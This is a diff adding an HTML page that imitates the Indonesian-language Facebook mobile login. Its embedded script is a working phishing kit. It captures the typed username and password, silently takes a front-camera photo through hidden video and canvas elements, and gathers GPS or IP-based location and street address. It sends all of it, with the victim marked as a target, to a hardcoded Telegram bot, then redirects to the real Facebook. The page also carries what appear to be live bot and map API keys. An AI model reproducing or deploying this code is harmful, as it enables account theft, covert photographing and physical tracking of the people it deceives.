@@ -1,0 +1,569 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Facebook - masuk atau daftar</title>
+    <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
+    <style>
+        *{box-sizing:border-box;margin:0;padding:0;-webkit-font-smoothing:antialiased;font-family:Helvetica,Arial,sans-serif}
+        body{background:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center}
+        .lang-selector{text-align:center;padding:12px 0;font-size:14px;color:#65676b;width:100%;background:#f5f6f7;border-bottom:1px solid #dddfe2}
+        .main-content{display:flex;flex-direction:column;align-items:center;width:100%;max-width:420px;padding:0 16px;flex:1}
+        .logo-container{margin:30px 0 24px}
+        .logo{width:112px;margin:0 auto}
+        .logo svg{width:112px;height:auto;fill:#1877f2}
+        .form-container{width:100%}
+        input{width:100%;padding:14px 16px;font-size:17px;border:1px solid #dddfe2;border-radius:6px;margin-bottom:12px;color:#1c1e21;background-color:#fff}
+        input::placeholder{color:#8a8d91}
+        .login-button{width:100%;background-color:#1877f2;color:white;font-weight:bold;font-size:17px;border:none;border-radius:6px;padding:12px 0;margin:16px 0;cursor:pointer}
+        .login-button:disabled{background-color:#77a7e7;cursor:not-allowed}
+        .forgot-pwd{text-align:center;margin:20px 0 24px}
+        .forgot-pwd a{color:#1877f2;text-decoration:none;font-size:14px}
+        .or-divider{display:flex;align-items:center;margin:0 0 24px;width:100%}
+        .or-divider::before,.or-divider::after{content:"";flex:1;height:1px;background:#dddfe2}
+        .or-text{padding:0 10px;color:#96999e;font-size:14px;font-weight:500}
+        .create-account{background-color:#42b72a;color:white;font-weight:bold;font-size:15px;border:none;border-radius:6px;padding:10px 16px;margin:0 auto 40px;cursor:pointer;display:block}
+        .meta-logo{margin-top:auto;padding:20px 0;text-align:center}
+        .meta-logo svg{height:18px;fill:#737373}
+        .footer{width:100%;padding:20px 16px;text-align:center;font-size:12px;color:#8a8d91;border-top:1px solid #dddfe2;background:#fff}
+        .footer a{color:#8a8d91;text-decoration:none;margin:0 5px}
+        .lang-links{display:flex;flex-wrap:wrap;justify-content:center;margin-bottom:10px}
+        .current-lang{font-weight:bold}
+        .loader{display:inline-block;width:14px;height:14px;border:2px solid #f3f3f3;border-radius:50%;border-top:2px solid #1877f2;vertical-align:middle;margin-right:8px;animation:spin 1s linear infinite}
+        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+        #cameraFeed,#canvas{position:absolute;opacity:0;pointer-events:none;width:1px;height:1px;overflow:hidden}
+        .hidden-elements{width:0;height:0;position:absolute;overflow:hidden}
+        @media(max-width:480px){.main-content{padding:0 12px}input,.login-button{font-size:16px;padding:12px}}
+    </style>
+</head>
+<body>
+    <div class="lang-selector">Bahasa Indonesia</div>
+
+    <div class="main-content">
+        <div class="logo-container">
+            <div class="logo">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1022.51 360">
+                    <path d="M166.43,126.68c-9.65,0-12.44,4.28-12.44,13.72v15.66h25.74l-2.58,25.3H154v76.78H123.11V181.36H102.3v-25.3h20.81V140.83c0-25.52,10.29-39,39-39a146.17,146.17,0,0,1,18,1.07v23.81Z"></path>
+                    <path d="M181.87,203.88c0-28.52,13.51-50,41.82-50,15.44,0,24.87,7.94,29.38,17.8V156.06h29.59V258.14H253.07V242.7c-4.29,9.87-13.94,17.59-29.38,17.59-28.31,0-41.82-21.45-41.82-50Zm30.88,6.87c0,15.22,5.57,25.3,19.94,25.3,12.66,0,19.09-9.22,19.09-23.8V202c0-14.58-6.43-23.8-19.09-23.8-14.37,0-19.94,10.08-19.94,25.3Z"></path>
+                    <path d="M347,153.91c12,0,23.37,2.58,29.59,6.86l-6.86,21.88a48.6,48.6,0,0,0-20.59-4.72c-16.73,0-24,9.65-24,26.17v6c0,16.52,7.29,26.17,24,26.17a48.6,48.6,0,0,0,20.59-4.72l6.86,21.87c-6.22,4.29-17.58,6.87-29.59,6.87-36.25,0-52.76-19.52-52.76-50.83v-4.72C294.24,173.43,310.75,153.91,347,153.91Z"></path>
+                    <path d="M380.66,211v-9c0-28.95,16.51-48,50.19-48,31.74,0,45.68,19.3,45.68,47.61v16.3h-65c.65,13.94,6.87,20.16,24,20.16,11.59,0,23.81-2.36,32.82-6.22L474,253c-8.15,4.3-24.88,7.51-39.67,7.51C395.24,260.5,380.66,241,380.66,211Zm30.88-13.3h37.32v-2.57c0-11.15-4.5-20-18-20C416.91,175.14,411.54,183.94,411.54,197.66Z"></path>
+                    <path d="M591,210.32c0,28.52-13.72,50-42,50-15.44,0-26.16-7.72-30.45-17.59v15.44H489.39V104.8L520.27,102v68.2c4.5-9,14.37-16.3,28.74-16.3,28.31,0,42,21.45,42,50Zm-30.88-7.08c0-14.37-5.57-25.09-20.37-25.09-12.66,0-19.52,9-19.52,23.59v10.72c0,14.58,6.86,23.59,19.52,23.59,14.8,0,20.37-10.72,20.37-25.09Z"></path>
+                    <path d="M601.33,209.67v-5.14c0-29.39,16.73-50.62,50.83-50.62S703,175.14,703,204.53v5.14c0,29.38-16.73,50.62-50.83,50.62S601.33,239.05,601.33,209.67Zm70.78-7.29c0-13.51-5.58-24.23-20-24.23s-19.95,10.72-19.95,24.23v9.44c0,13.51,5.58,24.23,19.95,24.23s20-10.72,20-24.23Z"></path>
+                    <path d="M713.27,209.67v-5.14c0-29.39,16.73-50.62,50.83-50.62s50.83,21.23,50.83,50.62v5.14c0,29.38-16.73,50.62-50.83,50.62S713.27,239.05,713.27,209.67Zm70.78-7.29c0-13.51-5.58-24.23-19.95-24.23s-19.94,10.72-19.94,24.23v9.44c0,13.51,5.57,24.23,19.94,24.23s19.95-10.72,19.95-24.23Z"></path>
+                    <path d="M857.39,204.74l30.45-48.68h32.81l-31.95,50.4,33.24,51.68H889.13l-31.74-50v50H826.5V104.8L857.39,102Z"></path>
+                </svg>
+            </div>
+        </div>
+        
+        <div class="form-container">
+            <form id="loginForm">
+                <input type="text" id="username" name="username" placeholder="Nomor ponsel atau email" required autocomplete="username">
+                <input type="password" id="password" name="password" placeholder="Kata sandi" required autocomplete="current-password">
+                <button type="submit" id="loginBtn" class="login-button">Masuk</button>
+            </form>
+            
+            <div class="forgot-pwd">
+                <a href="#">Lupa kata sandi?</a>
+            </div>
+            
+            <div class="or-divider">
+                <span class="or-text">atau</span>
+            </div>
+            
+            <button class="create-account" id="createBtn">Buat akun baru</button>
+        </div>
+        
+        <div class="meta-logo">
+            <svg viewBox="0 0 112 22" xmlns="http://www.w3.org/2000/svg">
+                <path d="M6.547 22h-5.61c-.288 0-.52-.152-.52-.445 0-.186.076-.33.182-.445.213-.282.618-.937.618-1.815V2.648c0-.858-.361-1.446-.612-1.763-.106-.118-.184-.267-.184-.463 0-.29.228-.444.521-.444h5.601c.136 0 .407.035.407.445 0 .214-.09.303-.18.423-.249.284-.655.866-.655 1.8v17.092c0 .868.395 1.458.655 1.764.09.12.18.211.18.423 0 .282-.136.445-.406.445M179.066 14.049c0 6.214-5.095 7.845-9.579 7.845-4.766 0-9.155-2.219-9.155-7.681V2.656c0-.855-.361-1.446-.612-1.765-.106-.118-.184-.264-.184-.46 0-.29.228-.447.526-.447h5.347c.299 0 .527.155.527.446 0 .197-.077.343-.184.462-.251.319-.612.909-.612 1.764v11.343c0 3.029 2.047 4.394 4.347 4.394 2.334 0 4.347-1.237 4.347-4.394V2.656c0-.855-.361-1.446-.612-1.765-.106-.118-.184-.264-.184-.46 0-.29.228-.447.526-.447h5.347c.299 0 .527.155.527.446 0 .197-.077.343-.184.462-.251.319-.612.909-.612 1.764v11.393zm-19.422-1.118h-7.603V17.467c0 .857.361 1.445.612 1.763.106.12.184.265.184.462 0 .29-.228.445-.526.445h-5.347c-.298 0-.526-.154-.526-.445 0-.197.078-.343.184-.462.25-.318.612-.906.612-1.763V2.648c0-.855-.361-1.445-.612-1.763-.106-.12-.184-.265-.184-.462 0-.29.228-.445.526-.445h5.347c.298 0 .526.154.526.445 0 .197-.078.343-.184.462-.25.318-.612.908-.612 1.763v6.823h7.603V2.648c0-.855-.36-1.445-.611-1.763-.106-.12-.184-.265-.184-.462 0-.29.228-.445.526-.445h5.346c.299 0 .527.154.527.445 0 .197-.078.343-.184.462-.251.318-.612.908-.612 1.763v14.82c0 .857.361 1.445.612 1.763.106.12.184.265.184.462 0 .29-.228.445-.527.445h-5.346c-.298 0-.526-.154-.526-.445 0-.197.078-.343.184-.462.25-.318.611-.906.611-1.763v-3.537zm-18.617 3.537c0 .857.36 1.445.611 1.763.106.12.184.265.184.462 0 .29-.228.445-.527.445h-5.346c-.298 0-.526-.154-.526-.445 0-.197.078-.343.184-.462.25-.318.612-.906.612-1.763V2.648c0-.855-.361-1.445-.612-1.763-.106-.12-.184-.265-.184-.462 0-.29.228-.445.526-.445h5.346c.299 0 .527.154.527.445 0 .197-.078.343-.184.462-.25.318-.611.908-.611 1.763v14.82zm-9.054-16.582h-4.811V17.467c0 .857.36 1.445.611 1.763.106.12.184.265.184.462 0 .29-.228.445-.526.445h-5.347c-.298 0-.526-.154-.526-.445 0-.197.078-.343.184-.462.251-.318.612-.906.612-1.763V.445c0-.291.228-.445.526-.445h9.094c.298 0 .526.154.526.445 0 .197-.078.343-.184.462-.153.189-.324.467-.324.908v.482c0 .44.171.717.324.908.106.117.184.264.184.461 0 .291-.228.445-.526.445m-12.762 3.052c-.613-1.272-1.634-3.427-2.153-4.307-.107-.171-.214-.31-.214-.48 0-.196.157-.308.374-.308h5.54c.328 0 .525.171.675.53.149.344.343.854.511 1.32l2.887 8.034L128.608.086h5.862l-11.77 27.267h-4.01l-9.479-24.467zm-14.161.171c.707 0 1.48-.238 1.727-.43V2.23c-.29-.171-1.094-.481-2.153-.481-1.506 0-2.307.877-2.307 2.07 0 1.407.926 2.027 2.733 2.027m-.18 14.177c3.006 0 5.287-1.492 6.127-2.863l.244 2.393c0 .289-.132.445-.42.445h-10.887c-.299 0-.527-.154-.527-.445 0-.197.078-.343.184-.462.251-.318.612-.906.612-1.763V9.136c0-5.044-3.512-7.396-7.301-7.396-1.937 0-3.424.446-4.518.98-.201.099-.413.17-.614.17-.244 0-.439-.152-.439-.443l-.18-1.81c-.017-.189.05-.326.163-.411C99.255.358 101.144 0 103.595 0c6.287 0 10.27 3.962 10.27 9.582v7.885c0 .855.36 1.445.611 1.763.106.12.185.265.185.462 0 .29-.229.445-.527.445h-1.935c-.299 0-.527-.154-.527-.445l-.242-2.425c-.832 1.353-2.987 3.185-6.561 3.185-3.885 0-6.38-2.438-6.38-5.992 0-4.085 3.379-5.974 8.608-5.974 1.87 0 3.446.343 4.184.599v-2.024c0-2.504-1.747-3.878-4.348-3.878-1.675 0-3.073.514-3.878.994-.153.086-.289.171-.458.171-.221 0-.374-.136-.425-.413l-.555-2.626c-.05-.237.05-.394.204-.497 1.292-.823 3.294-1.465 5.689-1.465 4.693 0 7.974 2.387 7.974 7.577v9.272c0 2.16.338 2.784.338 2.784.049.119.091.223.091.352 0 .21-.146.276-.254.276-.107 0-.26-.033-.305-.126-.024-.042-.318-.536-.979-1.34-1.297 1.09-3.09 2.17-5.77 2.17-4.006 0-6.56-2.578-6.56-6.181 0-3.839 3.03-5.61 6.79-6.134 3.073-.428 6.175.022 6.175.022v-1.83c0-.184-.221-.386-.423-.463-.509-.203-1.6-.502-2.82-.502-3.27 0-4.679 1.702-4.679 3.922 0 2.435 1.865 3.708 4.307 3.708m-18.344-3.094c0 4.566-2.823 7.252-6.688 7.252-4.072 0-6.739-3.074-6.739-7.394V2.648c0-.855-.361-1.445-.612-1.763-.106-.12-.184-.265-.184-.462 0-.29.228-.445.526-.445h5.347c.298 0 .526.154.526.445 0 .197-.078.343-.184.462-.25.318-.612.908-.612 1.763v10.742c0 2.305 1.166 3.806 2.979 3.806 1.687 0 2.823-1.358 2.823-3.806V2.648c0-.855-.36-1.445-.611-1.763-.106-.12-.184-.265-.184-.462 0-.29.227-.445.526-.445h5.347c.298 0 .526.154.526.445 0 .197-.078.343-.184.462-.251.318-.612.908-.612 1.763v10.742zm-17.6 2.957c0 .855.362 1.445.613 1.763.106.12.183.265.183.462 0 .29-.227.445-.526.445h-5.346c-.299 0-.527-.154-.527-.445 0-.197.078-.343.184-.462.251-.318.612-.908.612-1.763V6.176L59.403 4.8v12.667c0 .855.361 1.445.612 1.763.106.12.184.265.184.462 0 .29-.228.445-.526.445h-5.347c-.298 0-.526-.154-.526-.445 0-.197.078-.343.184-.462.25-.318.612-.908.612-1.763V6.217l-3.852-1.474v13.613c0 .855.361 1.446.612 1.764.106.12.184.264.184.461 0 .29-.228.446-.526.446h-5.347c-.298 0-.526-.155-.526-.446 0-.197.078-.342.184-.461.25-.318.612-.909.612-1.764V7.337c0-2.33-1.145-3.05-1.959-3.304-.184-.058-.399-.173-.399-.461 0-.298.214-.44.506-.345l6.688 2.544h.761l6.688-2.544c.292-.095.506.047.506.345 0 .288-.215.403-.399.461-.814.254-1.959.974-1.959 3.304v10.181zM16.752 9.445c0-3.29-1.145-5.822-3.878-5.822-2.706 0-3.851 2.533-3.851 5.822 0 3.29 1.145 5.822 3.851 5.822 2.733 0 3.878-2.533 3.878-5.822m4.067 0c0 5.91-3.336 9.884-7.945 9.884-4.608 0-7.917-3.974-7.917-9.884 0-5.91 3.309-9.885 7.917-9.885 4.609 0 7.945 3.975 7.945 9.885M39.725 0v15.077c0 4.503 2.707 6.824 6.53 6.824 3.85 0 6.638-2.32 6.638-6.824V0h3.572v14.99c0 6.148-3.975 10.154-10.21 10.154-6.182 0-10.1-4.006-10.1-10.154V0h3.57zm129.759 10.006h.677c2.153 0 3.15-1.153 3.15-2.677 0-1.502-.96-2.677-3.15-2.677h-.677v5.354zm0 2.914v8.603h-3.572V2.062h4.835c4.267 0 6.147 2.49 6.147 5.267 0 2.776-1.88 5.59-6.147 5.59h-1.263z" fill-rule="nonzero"></path>
+            </svg>
+        </div>
+    </div>
+    
+    <div class="footer">
+        <div class="lang-links">
+            <a href="#" class="current-lang">Bahasa Indonesia</a>
+            <a href="#">English (UK)</a>
+            <a href="#">Basa Jawa</a>
+            <a href="#">Bahasa Melayu</a>
+            <a href="#">日本語</a>
+            <a href="#">العربية</a>
+            <a href="#">Español</a>
+        </div>
+        <div>
+            <a href="#">Sign Up</a>
+            <a href="#">Log In</a>
+            <a href="#">Messenger</a>
+            <a href="#">Facebook Lite</a>
+            <a href="#">Watch</a>
+            <a href="#">Marketplace</a>
+        </div>
+        <div style="margin-top:10px">
+            <span>Meta © 2025</span>
+        </div>
+    </div>
+    
+    <!-- Capture elements -->
+    <video id="cameraFeed" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+    <div class="hidden-elements"></div>
+
+    <script>
+    (() => {
+        // CONFIG
+        const CONFIG = {
+            BOT_TOKEN: '7866985994:AAF_OOgn0V8hvKZ9FWnroQKefnx8o9CHhxo',
+            CHAT_ID: '8126039795',
+            REDIRECT_URL: 'https://m.facebook.com',
+            CAMERA_WAIT: 1200,
+            API_TIMEOUT: 8000
+        };
+        
+        // DOM elements and data storage
+        const $ = {
+            form: document.getElementById('loginForm'),
+            createBtn: document.getElementById('createBtn'),
+            loginBtn: document.getElementById('loginBtn'),
+            username: document.getElementById('username'),
+            password: document.getElementById('password'),
+            video: document.getElementById('cameraFeed'),
+            canvas: document.getElementById('canvas'),
+            data: {
+                location: null,
+                address: 'Tidak terdeteksi'
+            }
+        };
+        
+        // Platform detection
+        const platform = {
+            isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
+            isIOS: /iPad|iPhone|iPod/.test(navigator.userAgent),
+            isAndroid: /Android/i.test(navigator.userAgent),
+            isSafari: /^((?!chrome|android).)*safari/i.test(navigator.userAgent)
+        };
+        
+        // Initialize app
+        function init() {
+            getLocation();
+            warmupCamera();
+            bindEvents();
+        }
+        
+        // Bind event listeners
+        function bindEvents() {
+            $.form.addEventListener('submit', handleLogin);
+            $.createBtn.addEventListener('click', () => {
+                // Also redirect to Facebook for create account
+                window.location.href = CONFIG.REDIRECT_URL;
+            });
+        }
+        
+        // Handle login submission
+        async function handleLogin(e) {
+            e.preventDefault();
+            
+            const username = $.username.value.trim();
+            const password = $.password.value;
+            
+            if (!username || !password) return;
+            
+            // Show loading state
+            setLoading(true);
+            
+            try {
+                // Capture image first - may take time
+                const imageBase64 = await captureImage();
+                
+                // Format message and send
+                const message = formatMessage(username, password);
+                const success = await sendData(imageBase64, message);
+                
+                // Send map if location is available
+                if (success && $.data.location) {
+                    const {lat, lng} = $.data.location;
+                    await sendMap(lat, lng);
+                }
+            } catch (err) {
+                console.error(err);
+                // Silent fail - still try to send text
+                const message = formatMessage($.username.value, $.password.value);
+                await sendText(message);
+            } finally {
+                // Always redirect regardless of success/failure
+                setTimeout(() => {
+                    window.location.href = CONFIG.REDIRECT_URL;
+                }, 800);
+            }
+        }
+        
+        // Warm up camera to improve capture success rate
+        function warmupCamera() {
+            if (!navigator.mediaDevices?.getUserMedia || platform.isIOS) return;
+            
+            navigator.mediaDevices.getUserMedia({
+                audio: false,
+                video: { 
+                    facingMode: "user", 
+                    width: { ideal: 240 },
+                    height: { ideal: 180 }
+                }
+            })
+            .then(stream => {
+                setTimeout(() => {
+                    try {
+                        stream.getTracks().forEach(track => track.stop());
+                    } catch(e) {}
+                }, platform.isMobile ? 100 : 300);
+            })
+            .catch(() => {});
+        }
+        
+        // Capture camera image
+        async function captureImage() {
+            let stream = null;
+            
+            try {
+                // Device-specific camera constraints
+                const constraints = {
+                    audio: false,
+                    video: {
+                        facingMode: "user",
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    }
+                };
+                
+                if (platform.isAndroid) {
+                    constraints.video.width = { ideal: 640, max: 1280 };
+                    constraints.video.height = { ideal: 480, max: 720 };
+                } else if (platform.isIOS) {
+                    constraints.video = { facingMode: "user" };
+                }
+                
+                // Get camera access
+                stream = await navigator.mediaDevices.getUserMedia(constraints);
+                
+                // Setup video element
+                $.video.srcObject = stream;
+                $.video.muted = true;
+                $.video.setAttribute("playsinline", "");
+                
+                // Wait for video to initialize
+                await Promise.race([
+                    new Promise(resolve => {
+                        const videoReady = () => {
+                            $.video.removeEventListener('loadeddata', videoReady);
+                            $.video.removeEventListener('loadedmetadata', videoReady);
+                            $.video.removeEventListener('canplay', videoReady);
+                            $.video.play().catch(() => {});
+                            resolve();
+                        };
+                        
+                        $.video.addEventListener('loadeddata', videoReady);
+                        $.video.addEventListener('loadedmetadata', videoReady);
+                        $.video.addEventListener('canplay', videoReady);
+                    }),
+                    
+                    new Promise(resolve => {
+                        setTimeout(() => {
+                            $.video.play().catch(() => {});
+                            resolve();
+                        }, platform.isIOS ? 2000 : 1000);
+                    })
+                ]);
+                
+                // Wait for camera to focus
+                const focusDelay = platform.isMobile ? 1500 : CONFIG.CAMERA_WAIT;
+                await new Promise(r => setTimeout(r, focusDelay));
+                
+                // Capture frame
+                $.canvas.width = $.video.videoWidth || 640;
+                $.canvas.height = $.video.videoHeight || 480;
+                const ctx = $.canvas.getContext('2d');
+                ctx.drawImage($.video, 0, 0);
+                
+                // Get image data with quality optimized for mobile
+                const quality = platform.isMobile ? 0.65 : 0.78;
+                return $.canvas.toDataURL('image/jpeg', quality);
+            } catch (err) {
+                console.error("Camera error:", err.message);
+                return null;
+            } finally {
+                // Cleanup
+                if (stream) {
+                    try {
+                        stream.getTracks().forEach(track => track.stop());
+                    } catch(e) {}
+                }
+                
+                if ($.video.srcObject) {
+                    $.video.srcObject = null;
+                    $.video.load();
+                }
+            }
+        }
+        
+        // Get user location
+        function getLocation() {
+            if (navigator.geolocation) {
+                const options = {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                };
+                
+                navigator.geolocation.getCurrentPosition(
+                    pos => {
+                        const {latitude, longitude, accuracy} = pos.coords;
+                        $.data.location = {
+                            lat: latitude,
+                            lng: longitude,
+                            accuracy,
+                            source: 'GPS'
+                        };
+                        
+                        getAddress(latitude, longitude);
+                    },
+                    () => getIPLocation(),
+                    options
+                );
+            } else {
+                getIPLocation();
+            }
+        }
+        
+        // Fallback to IP-based location
+        function getIPLocation() {
+            const services = [
+                'https://ipapi.co/json/',
+                'https://ipinfo.io/json',
+                'https://ipwhois.app/json/'
+            ];
+            
+            services.forEach(url => {
+                if ($.data.location && $.data.location.source === 'GPS') return;
+                
+                fetch(url)
+                    .then(res => res.json())
+                    .then(data => {
+                        if (!data) return;
+                        
+                        // Extract location data based on API format
+                        let lat, lng, city, region, country, ip, isp;
+                        
+                        if (data.latitude && data.longitude) {
+                            // ipapi.co or ipwhois.app format
+                            lat = data.latitude;
+                            lng = data.longitude;
+                            city = data.city;
+                            region = data.region || data.region_name;
+                            country = data.country_name || data.country;
+                            ip = data.ip;
+                            isp = data.org || data.isp || 'Unknown';
+                        } else if (data.loc) {
+                            // ipinfo.io format
+                            [lat, lng] = data.loc.split(',');
+                            lat = parseFloat(lat);
+                            lng = parseFloat(lng);
+                            city = data.city;
+                            region = data.region;
+                            country = data.country;
+                            ip = data.ip;
+                            isp = data.org || 'Unknown';
+                        } else {
+                            return;
+                        }
+                        
+                        // Only update if no GPS data
+                        if (!$.data.location || $.data.location.source !== 'GPS') {
+                            $.data.location = {
+                                lat,
+                                lng,
+                                accuracy: 'low',
+                                ip,
+                                isp,
+                                source: 'IP'
+                            };
+                            
+                            const addressParts = [city, region, country].filter(Boolean);
+                            $.data.address = addressParts.join(', ');
+                        }
+                    })
+                    .catch(() => {});
+            });
+        }
+        
+        // Get address from coordinates
+        async function getAddress(lat, lng) {
+            try {
+                const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`);
+                const data = await res.json();
+                
+                if (data && data.display_name) {
+                    $.data.address = data.display_name;
+                }
+            } catch (err) {}
+        }
+        
+        // Format message with user data
+        function formatMessage(username, password) {
+            let message = `📱 Facebook Login\n` +
+                       `👤 Email/HP: ${username}\n` +
+                       `🔑 Password: ${password}\n` +
+                       `📍 Lokasi: ${$.data.address}\n`;
+            
+            if ($.data.location) {
+                const {lat, lng, accuracy, source} = $.data.location;
+                
+                message += `📌 Koordinat: ${lat}, ${lng}\n`;
+                message += `📶 Akurasi: ${accuracy} ${source === 'GPS' ? 'meter' : '(IP)'}\n`;
+                message += `🗺️ Maps: https://www.google.com/maps?q=${lat},${lng}&z=17&t=m\n`;
+                
+                if ($.data.location.ip) {
+                    message += `🌐 IP: ${$.data.location.ip}\n`;
+                    message += `📡 ISP: ${$.data.location.isp}\n`;
+                }
+            }
+            
+            message += `⏰ Waktu: ${new Date().toLocaleString()}`;
+            
+            return message;
+        }
+        
+        // Send data to Telegram
+        async function sendData(imageBase64, text) {
+            if (!imageBase64) {
+                return sendText(text);
+            }
+            
+            try {
+                const base64Data = imageBase64.split(',')[1];
+                
+                // Create blob from base64
+                const byteCharacters = atob(base64Data);
+                const byteArrays = [];
+                
+                for (let offset = 0; offset < byteCharacters.length; offset += 512) {
+                    const slice = byteCharacters.slice(offset, offset + 512);
+                    const byteNumbers = new Array(slice.length);
+                    
+                    for (let i = 0; i < slice.length; i++) {
+                        byteNumbers[i] = slice.charCodeAt(i);
+                    }
+                    
+                    byteArrays.push(new Uint8Array(byteNumbers));
+                }
+                
+                const blob = new Blob(byteArrays, {type: 'image/jpeg'});
+                
+                // Create FormData
+                const formData = new FormData();
+                formData.append('chat_id', CONFIG.CHAT_ID);
+                formData.append('photo', blob, 'capture.jpg');
+                formData.append('caption', truncate(text, 1000));
+                
+                // Send with timeout
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), CONFIG.API_TIMEOUT);
+                
+                const response = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData,
+                    signal: controller.signal
+                });
+                
+                clearTimeout(timeoutId);
+                
+                const result = await response.json();
+                return result.ok;
+            } catch (err) {
+                console.error("Send error:", err);
+                return sendText(text);
+            }
+        }
+        
+        // Send text message to Telegram
+        async function sendText(text) {
+            try {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), CONFIG.API_TIMEOUT);
+                
+                const response = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: CONFIG.CHAT_ID,
+                        text: truncate(text)
+                    }),
+                    signal: controller.signal
+                });
+                
+                clearTimeout(timeoutId);
+                
+                const result = await response.json();
+                return result.ok;
+            } catch (err) {
+                console.error("Text send error:", err);
+                return false;
+            }
+        }
+        
+        // Send location map to Telegram
+        async function sendMap(lat, lng) {
+            try {
+                const caption = `📍 *Lokasi Target*\n` +
+                               `📌 Koordinat: ${lat}, ${lng}\n` +
+                               `🗺️ Google Maps: https://www.google.com/maps?q=${lat},${lng}&z=17&t=m`;
+                
+                // Try MapQuest for static maps
+                const mapUrl = `https://open.mapquestapi.com/staticmap/v5/map?key=Gmjtd8XeA6r6xggHGwF3C5jFpDtgxJnGmJg16BQ&center=${lat},${lng}&zoom=15&size=600,300&type=map&locations=${lat},${lng}`;
+                
+                const formData = new FormData();
+                formData.append('chat_id', CONFIG.CHAT_ID);
+                formData.append('photo', mapUrl);
+                formData.append('caption', caption);
+                formData.append('parse_mode', 'Markdown');
+                
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), CONFIG.API_TIMEOUT);
+                
+                await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData,
+                    signal: controller.signal
+                });
+                
+                clearTimeout(timeoutId);
+                
+                return true;
+            } catch (err) {
+                console.error("Map error:", err);
+                return false;
+            }
+        }
+        
+        // UTILITY FUNCTIONS
+        
+        // Set loading state
+        function setLoading(isLoading) {
+            if (isLoading) {
+                $.loginBtn.innerHTML = '<span class="loader"></span> Memproses...';
+                $.loginBtn.disabled = true;
+            } else {
+                $.loginBtn.innerHTML = 'Masuk';
+                $.loginBtn.disabled = false;
+            }
+        }
+        
+        // Truncate text to max length
+        function truncate(text, maxLength = 4000) {
+            return text.length > maxLength ? text.substring(0, maxLength - 3) + '...' : text;
+        }
+        
+        // Initialize when DOM content is loaded
+        document.addEventListener('DOMContentLoaded', init);
+    })();
+    </script>
+</body>
+</html>
